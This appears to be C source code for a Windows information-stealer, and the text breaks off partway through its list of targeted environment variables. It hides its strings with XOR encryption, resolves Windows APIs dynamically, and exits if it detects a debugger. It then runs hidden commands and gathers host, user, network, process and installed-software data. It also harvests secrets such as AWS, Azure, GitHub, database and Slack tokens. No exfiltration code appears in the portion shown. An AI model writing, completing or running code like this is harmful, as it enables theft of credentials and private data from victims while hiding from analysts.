#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <tlhelp32.h>





static const unsigned char _xk[16] = {0x1f, 0x66, 0xbd, 0x74, 0xa9, 0x25, 0xbc, 0x63, 0xe7, 0x48, 0xf6, 0xdb, 0x3c, 0x7a, 0x40, 0x15};
static unsigned char _es0[13] = {0x74, 0x03, 0xcf, 0x1a, 0xcc, 0x49, 0x8f, 0x51, 0xc9, 0x2c, 0x9a, 0xb7, 0};
static unsigned char _es1[13] = {0x7e, 0x02, 0xcb, 0x15, 0xd9, 0x4c, 0x8f, 0x51, 0xc9, 0x2c, 0x9a, 0xb7, 0};
static unsigned char _es2[25] = {0x5c, 0x14, 0xd8, 0x15, 0xdd, 0x40, 0xe8, 0x0c, 0x88, 0x24, 0x9e, 0xbe, 0x50, 0x0a, 0x73, 0x27, 0x4c, 0x08, 0xdc, 0x04, 0xda, 0x4d, 0xd3, 0x17, 0};
static unsigned char _es3[15] = {0x4f, 0x14, 0xd2, 0x17, 0xcc, 0x56, 0xcf, 0x50, 0xd5, 0x0e, 0x9f, 0xa9, 0x4f, 0x0e, 0};
static unsigned char _es4[14] = {0x4f, 0x14, 0xd2, 0x17, 0xcc, 0x56, 0xcf, 0x50, 0xd5, 0x06, 0x93, 0xa3, 0x48, 0};
static unsigned char _es5[14] = {0x4d, 0x03, 0xda, 0x3b, 0xd9, 0x40, 0xd2, 0x28, 0x82, 0x31, 0xb3, 0xa3, 0x7d, 0};
static unsigned char _es6[18] = {0x56, 0x15, 0xf9, 0x11, 0xcb, 0x50, 0xdb, 0x04, 0x82, 0x3a, 0xa6, 0xa9, 0x59, 0x09, 0x25, 0x7b, 0x6b, 0};
static unsigned char _es7[27] = {0x5c, 0x0e, 0xd8, 0x17, 0xc2, 0x77, 0xd9, 0x0e, 0x88, 0x3c, 0x93, 0x9f, 0x59, 0x18, 0x35, 0x72, 0x78, 0x03, 0xcf, 0x24, 0xdb, 0x40, 0xcf, 0x06, 0x89, 0x3c, 0};
static unsigned char _es8[22] = {0x22, 0x5b, 0x80, 0x54, 0xfa, 0x7c, 0xef, 0x37, 0xa2, 0x05, 0xd6, 0x92, 0x72, 0x3c, 0x0f, 0x35, 0x22, 0x5b, 0x80, 0x79, 0xa3, 0};
static unsigned char _es9[6] = {0x5e, 0x34, 0xf0, 0x42, 0x9d, 0};
static unsigned char _es10[61] = {0x7c, 0x0b, 0xd9, 0x54, 0x86, 0x46, 0x9c, 0x10, 0x9e, 0x3b, 0x82, 0xbe, 0x51, 0x13, 0x2e, 0x73, 0x70, 0x46, 0xc1, 0x54, 0xcf, 0x4c, 0xd2, 0x07, 0x94, 0x3c, 0x84, 0xfb, 0x13, 0x38, 0x60, 0x3a, 0x5c, 0x5c, 0x9f, 0x30, 0xc6, 0x48, 0xdd, 0x0a, 0x89, 0x6a, 0xd6, 0xf4, 0x7f, 0x40, 0x62, 0x59, 0x70, 0x01, 0xd2, 0x1a, 0x89, 0x76, 0xd9, 0x11, 0x91, 0x2d, 0x84, 0xf9, 0};
static unsigned char _es11[28] = {0x22, 0x5b, 0x80, 0x54, 0xfb, 0x70, 0xf2, 0x2d, 0xae, 0x06, 0xb1, 0xfb, 0x6c, 0x28, 0x0f, 0x56, 0x5a, 0x35, 0xee, 0x31, 0xfa, 0x05, 0x81, 0x5e, 0xda, 0x45, 0xfc, 0};
static unsigned char _es12[12] = {0x5b, 0x0f, 0xce, 0x04, 0xc5, 0x44, 0xc5, 0x2d, 0x86, 0x25, 0x93, 0};
static unsigned char _es13[15] = {0x5b, 0x0f, 0xce, 0x04, 0xc5, 0x44, 0xc5, 0x35, 0x82, 0x3a, 0x85, 0xb2, 0x53, 0x14, 0};
static unsigned char _es14[29] = {0x22, 0x5b, 0x80, 0x54, 0xe0, 0x6b, 0xef, 0x37, 0xa6, 0x04, 0xba, 0x9e, 0x78, 0x5a, 0x13, 0x5a, 0x59, 0x32, 0xea, 0x35, 0xfb, 0x60, 0x9c, 0x5e, 0xda, 0x75, 0xfb, 0xd1, 0};
static unsigned char _es15[52] = {0x4c, 0x29, 0xfb, 0x20, 0xfe, 0x64, 0xee, 0x26, 0xbb, 0x05, 0x9f, 0xb8, 0x4e, 0x15, 0x33, 0x7a, 0x79, 0x12, 0xe1, 0x23, 0xc0, 0x4b, 0xd8, 0x0c, 0x90, 0x3b, 0xaa, 0x98, 0x49, 0x08, 0x32, 0x70, 0x71, 0x12, 0xeb, 0x11, 0xdb, 0x56, 0xd5, 0x0c, 0x89, 0x14, 0xa3, 0xb5, 0x55, 0x14, 0x33, 0x61, 0x7e, 0x0a, 0xd1, 0};
static unsigned char _es16[52] = {0x4c, 0x29, 0xfb, 0x20, 0xfe, 0x64, 0xee, 0x26, 0xbb, 0x05, 0x9f, 0xb8, 0x4e, 0x15, 0x33, 0x7a, 0x79, 0x12, 0xe1, 0x23, 0xc0, 0x4b, 0xd8, 0x0c, 0x90, 0x3b, 0xaa, 0x98, 0x49, 0x08, 0x32, 0x70, 0x71, 0x12, 0xeb, 0x11, 0xdb, 0x56, 0xd5, 0x0c, 0x89, 0x14, 0xa3, 0xb5, 0x55, 0x14, 0x33, 0x61, 0x7e, 0x0a, 0xd1, 0};
static unsigned char _es17[27] = {0x22, 0x5b, 0x80, 0x54, 0xec, 0x6b, 0xea, 0x2a, 0xb5, 0x07, 0xb8, 0x96, 0x79, 0x34, 0x14, 0x35, 0x49, 0x27, 0xef, 0x27, 0x89, 0x18, 0x81, 0x5e, 0xea, 0x42, 0};
static unsigned char _es18[20] = {0x22, 0x5b, 0x80, 0x54, 0xea, 0x69, 0xf5, 0x33, 0xa5, 0x07, 0xb7, 0x89, 0x78, 0x5a, 0x7d, 0x28, 0x22, 0x6b, 0xb7, 0};
static unsigned char _es19[9] = {0x3a, 0x48, 0x97, 0x07, 0xa4, 0x2f, 0xb1, 0x69, 0};
static unsigned char _es20[25] = {0x22, 0x5b, 0x80, 0x54, 0xfe, 0x6c, 0xfa, 0x2a, 0xc7, 0x18, 0xb7, 0x88, 0x6f, 0x2d, 0x0f, 0x47, 0x5b, 0x35, 0x9d, 0x49, 0x94, 0x18, 0xb1, 0x69, 0};
static unsigned char _es21[32] = {0x7c, 0x0b, 0xd9, 0x54, 0x86, 0x46, 0x9c, 0x0d, 0x82, 0x3c, 0x85, 0xb3, 0x1c, 0x0d, 0x2c, 0x74, 0x71, 0x46, 0xce, 0x1c, 0xc6, 0x52, 0x9c, 0x13, 0x95, 0x27, 0x90, 0xb2, 0x50, 0x1f, 0x33, 0};
static unsigned char _es22[22] = {0x37, 0x08, 0xd2, 0x54, 0xde, 0x49, 0xdd, 0x0d, 0xc7, 0x3b, 0x93, 0xa9, 0x4a, 0x13, 0x23, 0x70, 0x36, 0x6b, 0xb7, 0x79, 0xa3, 0};
static unsigned char _es23[17] = {0x5e, 0x0a, 0xd1, 0x54, 0xfc, 0x56, 0xd9, 0x11, 0xc7, 0x18, 0x84, 0xb4, 0x5a, 0x13, 0x2c, 0x70, 0};
static unsigned char _es24[8] = {0x4f, 0x14, 0xd2, 0x12, 0xc0, 0x49, 0xd9, 0};
static unsigned char _es25[12] = {0x54, 0x03, 0xc4, 0x54, 0xea, 0x4a, 0xd2, 0x17, 0x82, 0x26, 0x82, 0};
static unsigned char _es26[12] = {0x74, 0x03, 0xc4, 0x54, 0xca, 0x4a, 0xd2, 0x17, 0x82, 0x26, 0x82, 0};
static unsigned char _es27[10] = {0x53, 0x09, 0xda, 0x1d, 0xc7, 0x61, 0xdd, 0x17, 0x86, 0};
static unsigned char _es28[8] = {0x5c, 0x09, 0xd2, 0x1f, 0xc0, 0x40, 0xcf, 0};
static unsigned char _es29[8] = {0x48, 0x03, 0xdf, 0x30, 0xc8, 0x51, 0xdd, 0};
static unsigned char _es30[8] = {0x57, 0x0f, 0xce, 0x00, 0xc6, 0x57, 0xc5, 0};
static unsigned char _es31[10] = {0x5d, 0x09, 0xd2, 0x1f, 0xc4, 0x44, 0xce, 0x08, 0x94, 0};
static unsigned char _es32[23] = {0x22, 0x5b, 0x80, 0x54, 0xeb, 0x77, 0xf3, 0x34, 0xb4, 0x0d, 0xa4, 0xfb, 0x78, 0x3b, 0x14, 0x54, 0x3f, 0x5b, 0x80, 0x49, 0xa4, 0x2f, 0};
static unsigned char _es33[14] = {0x7a, 0x08, 0xde, 0x06, 0xd0, 0x55, 0xc8, 0x06, 0x83, 0x17, 0x9d, 0xbe, 0x45, 0};
static unsigned char _es34[8] = {0x5b, 0x03, 0xdb, 0x15, 0xdc, 0x49, 0xc8, 0};
static unsigned char _es35[13] = {0x7b, 0x37, 0xca, 0x40, 0xde, 0x1c, 0xeb, 0x04, 0xbf, 0x2b, 0xa7, 0xe1, 0};
static unsigned char _es36[16] = {0x3f, 0x46, 0xc9, 0x1b, 0xc2, 0x40, 0xd2, 0x59, 0xc7, 0x6d, 0xd8, 0xf1, 0x4f, 0x77, 0x4a, 0};
static unsigned char _es37[5] = {0x72, 0x00, 0xdc, 0x5a, 0};
static unsigned char _es38[20] = {0x3f, 0x46, 0xd0, 0x12, 0xc8, 0x7a, 0xc8, 0x0c, 0x8c, 0x2d, 0x98, 0xe1, 0x1c, 0x5f, 0x6e, 0x3f, 0x6c, 0x6b, 0xb7, 0};
static unsigned char _es39[25] = {0x22, 0x5b, 0x80, 0x54, 0xed, 0x6c, 0xef, 0x20, 0xa8, 0x1a, 0xb2, 0xfb, 0x68, 0x35, 0x0b, 0x50, 0x51, 0x35, 0x9d, 0x49, 0x94, 0x18, 0xb1, 0x69, 0};
static unsigned char _es40[19] = {0x22, 0x5b, 0x80, 0x54, 0xfd, 0x60, 0xf0, 0x26, 0xa0, 0x1a, 0xb7, 0x96, 0x1c, 0x47, 0x7d, 0x28, 0x12, 0x6c, 0};
static unsigned char _es41[23] = {0x3f, 0x46, 0xd6, 0x11, 0xd0, 0x7a, 0xd8, 0x02, 0x93, 0x29, 0x85, 0xe1, 0x1c, 0x0a, 0x32, 0x70, 0x6c, 0x03, 0xd3, 0x00, 0xa4, 0x2f, 0};
static unsigned char _es42[26] = {0x22, 0x5b, 0x80, 0x54, 0xef, 0x71, 0xec, 0x43, 0xa4, 0x1a, 0xb3, 0x9f, 0x79, 0x34, 0x14, 0x5c, 0x5e, 0x2a, 0xee, 0x54, 0x94, 0x18, 0x81, 0x6e, 0xed, 0};
static unsigned char _es43[32] = {0x44, 0x20, 0xd4, 0x18, 0xcc, 0x7f, 0xd5, 0x0f, 0x8b, 0x29, 0xd6, 0xa9, 0x59, 0x19, 0x25, 0x7b, 0x6b, 0x15, 0xd8, 0x06, 0xdf, 0x40, 0xce, 0x10, 0xc9, 0x30, 0x9b, 0xb7, 0x61, 0x77, 0x4a, 0};
static unsigned char _es44[30] = {0x44, 0x20, 0xd4, 0x18, 0xcc, 0x7f, 0xd5, 0x0f, 0x8b, 0x29, 0xd6, 0xa8, 0x55, 0x0e, 0x25, 0x78, 0x7e, 0x08, 0xdc, 0x13, 0xcc, 0x57, 0x92, 0x1b, 0x8a, 0x24, 0xab, 0xd6, 0x36, 0};
static unsigned char _es45[42] = {0x4c, 0x29, 0xfb, 0x20, 0xfe, 0x64, 0xee, 0x26, 0xbb, 0x05, 0x97, 0xa9, 0x48, 0x13, 0x2e, 0x35, 0x4f, 0x14, 0xd4, 0x1f, 0xdb, 0x5c, 0xd0, 0x3f, 0xb0, 0x21, 0x98, 0x88, 0x7f, 0x2a, 0x60, 0x27, 0x43, 0x35, 0xd8, 0x07, 0xda, 0x4c, 0xd3, 0x0d, 0x94, 0};
static unsigned char _es46[26] = {0x22, 0x5b, 0x80, 0x54, 0xef, 0x71, 0xec, 0x43, 0xa4, 0x1a, 0xb3, 0x9f, 0x79, 0x34, 0x14, 0x5c, 0x5e, 0x2a, 0xee, 0x54, 0x94, 0x18, 0x81, 0x6e, 0xed, 0};
static unsigned char _es47[20] = {0x44, 0x31, 0xd4, 0x1a, 0xfa, 0x66, 0xec, 0x43, 0x94, 0x2d, 0x85, 0xa8, 0x55, 0x15, 0x2e, 0x66, 0x42, 0x6b, 0xb7, 0};
static unsigned char _es48[9] = {0x57, 0x09, 0xce, 0x00, 0xe7, 0x44, 0xd1, 0x06, 0};
static unsigned char _es49[9] = {0x4a, 0x15, 0xd8, 0x06, 0xe7, 0x44, 0xd1, 0x06, 0};
static unsigned char _es50[9] = {0x4f, 0x07, 0xce, 0x07, 0xde, 0x4a, 0xce, 0x07, 0};
static unsigned char _es51[12] = {0x37, 0x0d, 0xd8, 0x0d, 0x84, 0x47, 0xdd, 0x10, 0x82, 0x2c, 0xdf, 0};
static unsigned char _es52[19] = {0x22, 0x5b, 0x80, 0x54, 0xfa, 0x76, 0xf4, 0x43, 0xac, 0x0d, 0xaf, 0x88, 0x1c, 0x47, 0x7d, 0x28, 0x12, 0x6c, 0};
static unsigned char _es53[26] = {0x22, 0x5b, 0x80, 0x54, 0xee, 0x6c, 0xe8, 0x43, 0xa4, 0x1a, 0xb3, 0x9f, 0x79, 0x34, 0x14, 0x5c, 0x5e, 0x2a, 0xee, 0x54, 0x94, 0x18, 0x81, 0x6e, 0xed, 0};
static unsigned char _es54[5] = {0x12, 0x6c, 0xb0, 0x7e, 0};
static unsigned char _es55[28] = {0x22, 0x5b, 0x80, 0x54, 0xea, 0x69, 0xf3, 0x36, 0xa3, 0x68, 0xb5, 0x89, 0x79, 0x3e, 0x05, 0x5b, 0x4b, 0x2f, 0xfc, 0x38, 0xfa, 0x05, 0x81, 0x5e, 0xda, 0x45, 0xfc, 0};
static unsigned char _es56[25] = {0x22, 0x5b, 0x80, 0x54, 0xea, 0x77, 0xe5, 0x33, 0xb3, 0x07, 0xd6, 0x8c, 0x7d, 0x36, 0x0c, 0x50, 0x4b, 0x35, 0x9d, 0x49, 0x94, 0x18, 0xb1, 0x69, 0};
static unsigned char _es57[21] = {0x22, 0x5b, 0x80, 0x54, 0xfa, 0x66, 0xee, 0x26, 0xa2, 0x06, 0xa5, 0x93, 0x73, 0x2e, 0x60, 0x28, 0x22, 0x5b, 0xb0, 0x7e, 0};
static unsigned char _es58[21] = {0x22, 0x5b, 0x80, 0x54, 0xfa, 0x66, 0xee, 0x26, 0xa2, 0x06, 0xa5, 0x93, 0x73, 0x2e, 0x60, 0x28, 0x22, 0x5b, 0xb0, 0x7e, 0};
static unsigned char _es59[34] = {0x3f, 0x46, 0x95, 0x07, 0xc2, 0x4c, 0xcc, 0x13, 0x82, 0x2c, 0xcc, 0xfb, 0x52, 0x15, 0x60, 0x71, 0x7a, 0x15, 0xd6, 0x00, 0xc6, 0x55, 0x9c, 0x10, 0x82, 0x3b, 0x85, 0xb2, 0x53, 0x14, 0x69, 0x18, 0x15, 0};
static void _xd_init(void){static int _d=0;if(_d)return;_d=1;for(int i=0;i<12;i++)_es0[i]^=_xk[i%16];for(int i=0;i<12;i++)_es1[i]^=_xk[i%16];for(int i=0;i<24;i++)_es2[i]^=_xk[i%16];for(int i=0;i<14;i++)_es3[i]^=_xk[i%16];for(int i=0;i<13;i++)_es4[i]^=_xk[i%16];for(int i=0;i<13;i++)_es5[i]^=_xk[i%16];for(int i=0;i<17;i++)_es6[i]^=_xk[i%16];for(int i=0;i<26;i++)_es7[i]^=_xk[i%16];for(int i=0;i<21;i++)_es8[i]^=_xk[i%16];for(int i=0;i<5;i++)_es9[i]^=_xk[i%16];for(int i=0;i<60;i++)_es10[i]^=_xk[i%16];for(int i=0;i<27;i++)_es11[i]^=_xk[i%16];for(int i=0;i<11;i++)_es12[i]^=_xk[i%16];for(int i=0;i<14;i++)_es13[i]^=_xk[i%16];for(int i=0;i<28;i++)_es14[i]^=_xk[i%16];for(int i=0;i<51;i++)_es15[i]^=_xk[i%16];for(int i=0;i<51;i++)_es16[i]^=_xk[i%16];for(int i=0;i<26;i++)_es17[i]^=_xk[i%16];for(int i=0;i<19;i++)_es18[i]^=_xk[i%16];for(int i=0;i<8;i++)_es19[i]^=_xk[i%16];for(int i=0;i<24;i++)_es20[i]^=_xk[i%16];for(int i=0;i<31;i++)_es21[i]^=_xk[i%16];for(int i=0;i<21;i++)_es22[i]^=_xk[i%16];for(int i=0;i<16;i++)_es23[i]^=_xk[i%16];for(int i=0;i<7;i++)_es24[i]^=_xk[i%16];for(int i=0;i<11;i++)_es25[i]^=_xk[i%16];for(int i=0;i<11;i++)_es26[i]^=_xk[i%16];for(int i=0;i<9;i++)_es27[i]^=_xk[i%16];for(int i=0;i<7;i++)_es28[i]^=_xk[i%16];for(int i=0;i<7;i++)_es29[i]^=_xk[i%16];for(int i=0;i<7;i++)_es30[i]^=_xk[i%16];for(int i=0;i<9;i++)_es31[i]^=_xk[i%16];for(int i=0;i<22;i++)_es32[i]^=_xk[i%16];for(int i=0;i<13;i++)_es33[i]^=_xk[i%16];for(int i=0;i<7;i++)_es34[i]^=_xk[i%16];for(int i=0;i<12;i++)_es35[i]^=_xk[i%16];for(int i=0;i<15;i++)_es36[i]^=_xk[i%16];for(int i=0;i<4;i++)_es37[i]^=_xk[i%16];for(int i=0;i<19;i++)_es38[i]^=_xk[i%16];for(int i=0;i<24;i++)_es39[i]^=_xk[i%16];for(int i=0;i<18;i++)_es40[i]^=_xk[i%16];for(int i=0;i<22;i++)_es41[i]^=_xk[i%16];for(int i=0;i<25;i++)_es42[i]^=_xk[i%16];for(int i=0;i<31;i++)_es43[i]^=_xk[i%16];for(int i=0;i<29;i++)_es44[i]^=_xk[i%16];for(int i=0;i<41;i++)_es45[i]^=_xk[i%16];for(int i=0;i<25;i++)_es46[i]^=_xk[i%16];for(int i=0;i<19;i++)_es47[i]^=_xk[i%16];for(int i=0;i<8;i++)_es48[i]^=_xk[i%16];for(int i=0;i<8;i++)_es49[i]^=_xk[i%16];for(int i=0;i<8;i++)_es50[i]^=_xk[i%16];for(int i=0;i<11;i++)_es51[i]^=_xk[i%16];for(int i=0;i<18;i++)_es52[i]^=_xk[i%16];for(int i=0;i<25;i++)_es53[i]^=_xk[i%16];for(int i=0;i<4;i++)_es54[i]^=_xk[i%16];for(int i=0;i<27;i++)_es55[i]^=_xk[i%16];for(int i=0;i<24;i++)_es56[i]^=_xk[i%16];for(int i=0;i<20;i++)_es57[i]^=_xk[i%16];for(int i=0;i<20;i++)_es58[i]^=_xk[i%16];for(int i=0;i<33;i++)_es59[i]^=_xk[i%16];}

/* dynamic API resolution */
typedef HANDLE (WINAPI *_tCreateToolhelp32Snapshot)(DWORD,DWORD);
static _tCreateToolhelp32Snapshot _pCreateToolhelp32Snapshot = NULL;
typedef BOOL (WINAPI *_tProcess32First)(HANDLE,LPPROCESSENTRY32);
static _tProcess32First _pProcess32First = NULL;
typedef BOOL (WINAPI *_tProcess32Next)(HANDLE,LPPROCESSENTRY32);
static _tProcess32Next _pProcess32Next = NULL;
typedef LSTATUS (WINAPI *_tRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
static _tRegOpenKeyExA _pRegOpenKeyExA = NULL;
typedef BOOL (WINAPI *_tIsDebuggerPresent)(void);
static _tIsDebuggerPresent _pIsDebuggerPresent = NULL;
typedef BOOL (WINAPI *_tCheckRemoteDebuggerPresent)(HANDLE,PBOOL);
static _tCheckRemoteDebuggerPresent _pCheckRemoteDebuggerPresent = NULL;
static void _api_init(void){static int _d=0;if(_d)return;_d=1;HMODULE _hkernel32_dll=LoadLibraryA(((char*)_es0));HMODULE _hadvapi32_dll=LoadLibraryA(((char*)_es1));if(_hkernel32_dll)_pCreateToolhelp32Snapshot=(_tCreateToolhelp32Snapshot)GetProcAddress(_hkernel32_dll,((char*)_es2));if(_hkernel32_dll)_pProcess32First=(_tProcess32First)GetProcAddress(_hkernel32_dll,((char*)_es3));if(_hkernel32_dll)_pProcess32Next=(_tProcess32Next)GetProcAddress(_hkernel32_dll,((char*)_es4));if(_hadvapi32_dll)_pRegOpenKeyExA=(_tRegOpenKeyExA)GetProcAddress(_hadvapi32_dll,((char*)_es5));if(_hkernel32_dll)_pIsDebuggerPresent=(_tIsDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es6));if(_hkernel32_dll)_pCheckRemoteDebuggerPresent=(_tCheckRemoteDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es7));}

/* anti-debugging — exit silently if analyst tools are detected */
static int _chk_dbg(void) {
    if (_pIsDebuggerPresent()) return 1;
    BOOL _rd = FALSE;
    _pCheckRemoteDebuggerPresent(GetCurrentProcess(), &_rd);
    if (_rd) return 1;
    /* timing check: rdtsc delta > 10M cycles = single-stepping */
    LARGE_INTEGER _f, _s, _e;
    if (QueryPerformanceFrequency(&_f) && QueryPerformanceCounter(&_s)) {
        volatile int _v = 0;
        for (int i = 0; i < 100; i++) _v += i;
        QueryPerformanceCounter(&_e);
        if ((_e.QuadPart - _s.QuadPart) > _f.QuadPart) return 1;
    }
    return 0;
}

/* ── core/emit_buffer ── */

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD _nmbfp = g_pos + n + (256 * (955 + 69));
        char *re = (char *)realloc(g_data, _nmbfp);
        if (!re) return;
        g_data = re;
        g_cap = _nmbfp;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── core/run_cmd ── */
static void run_cmd(const char *cmd, char *out, DWORD out_sz, DWORD *out_len) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hRead, hWrite;
    *out_len = 0;
    { volatile DWORD _jd4563 = GetTickCount(); (void)_jd4563; }
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    char buf[512];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    { volatile int _jv1983 = 0; _jv1983 = _jv1983 ^ _jv1983; (void)_jv1983; }
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, (14900 + 100));
    DWORD _toqye = 0, _rbits = 0;
    while (_toqye < out_sz - 1 && ReadFile(hRead, out + _toqye, out_sz - _toqye - 1, &_rbits, NULL) && _rbits > 0)
        _toqye += _rbits;
    out[_toqye] = '\0';
    *out_len = _toqye;
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


/* ── core/file_ops ── */
static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD _seajz = GetFileSize(h, NULL);
    if (_seajz == 0 || _seajz > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(_seajz);
    if (buf) {
        DWORD _rbits;
        { volatile DWORD _jp5424 = GetCurrentProcessId(); (void)_jp5424; }
        if (ReadFile(h, buf, _seajz, &_rbits, NULL) && _rbits > 0)
            emit((const char *)buf, _rbits);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        HANDLE _hoikk = CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD _fnjfg = (_hoikk != INVALID_HANDLE_VALUE) ? GetFileSize(_hoikk, NULL) : 0;
        if (_hoikk != INVALID_HANDLE_VALUE) CloseHandle(_hoikk);
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)_fnjfg);
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}


/* ── collectors/system_info ── */

static void collect_system_info(void) {
    emitf(((char*)_es8));

    char hostname[256] = {0};
    DWORD _hyfst = sizeof(hostname);
    if (GetComputerNameA(hostname, &_hyfst)) emitf("Hostname: %s\r\n", hostname);

    char user[256] = {0};
    DWORD _umgbg = sizeof(user);
    if (GetUserNameA(user, &_umgbg)) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? ((char*)_es9) : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    { volatile DWORD _jd5666 = GetTickCount(); (void)_jd5666; }
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * (1001 + 23)));

    ULONG _akfds = 0;
    GetAdaptersInfo(NULL, &_akfds);
    if (_akfds > 0) {
        PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(_akfds);
        if (ai && GetAdaptersInfo(ai, &_akfds) == NO_ERROR) {
            for (PIP_ADAPTER_INFO p = ai; p; p = p->Next)
                emitf("NIC: %s  IP: %s  MAC: %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                      p->Description, p->IpAddressList.IpAddress.String,
                      p->Address[0], p->Address[1], p->Address[2],
                      p->Address[3], p->Address[4], p->Address[5]);
        }
        free(ai);
    }

    char cmd_out[4096] = {0};
    DWORD _cciht = 0;
    run_cmd(((char*)_es10),
            cmd_out, sizeof(cmd_out), &_cciht);
    if (_cciht > 0) emitf("%s", cmd_out);

    emitf("\r\n");
}


/* ── collectors/processes ── */

static void collect_processes(void) {
    emitf(((char*)_es11));
    HANDLE _siesi = _pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (_siesi == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (_pProcess32First(_siesi, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (_pProcess32Next(_siesi, &pe));
    }
    CloseHandle(_siesi);
    emitf("\r\n");
}


/* ── collectors/installed_software ── */
static void enum_installed_from_key(HKEY root, const char *subkey) {
    HKEY _hbmkh;
    if (_pRegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &_hbmkh) != ERROR_SUCCESS)
        return;
    char name[256];
    DWORD _ivqvz = 0, name_sz;
    while (1) {
        name_sz = sizeof(name);
        if (RegEnumKeyExA(_hbmkh, _ivqvz++, name, &name_sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        HKEY _saouu;
        if (_pRegOpenKeyExA(_hbmkh, name, 0, KEY_READ, &_saouu) == ERROR_SUCCESS) {
            char display[256] = {0}, version[64] = {0};
            DWORD _dcgyc = sizeof(display), vsz = sizeof(version);
            RegQueryValueExA(_saouu, ((char*)_es12), NULL, NULL, (BYTE *)display, &_dcgyc);
            RegQueryValueExA(_saouu, ((char*)_es13), NULL, NULL, (BYTE *)version, &vsz);
            { volatile int _jx2871 = 1; while(_jx2871 > 1) _jx2871--; (void)_jx2871; }
            if (display[0])
                emitf("  %s %s\r\n", display, version);
            RegCloseKey(_saouu);
        }
    }
    RegCloseKey(_hbmkh);
}

static void collect_installed_software(void) {
    emitf(((char*)_es14));
    enum_installed_from_key(HKEY_LOCAL_MACHINE,
        ((char*)_es15));
    enum_installed_from_key(HKEY_CURRENT_USER,
        ((char*)_es16));
    emitf("\r\n");
}


/* ── collectors/env_vars ── */
static void collect_env_vars(void) {
    emitf(((char*)_es17));
    const char *interesting[] = {
        "USERDOMAIN", "LOGONSERVER", "COMPUTERNAME", "USERNAME",
        "HOMEPATH", "USERPROFILE", "PATH",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "AZURE_SUBSCRIPTION_ID", "AZURE_TENANT_ID", "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN",
        "DOCKER_HOST", "KUBECONFIG",
        "DATABASE_URL", "MONGO_URI", "REDIS_URL",
        "SLACK_TOKEN", "SLACK_WEBHOOK_URL",
        "SMTP_PASSWORD", "SENDGRID_API_KEY", "MAILGUN_API_KEY",
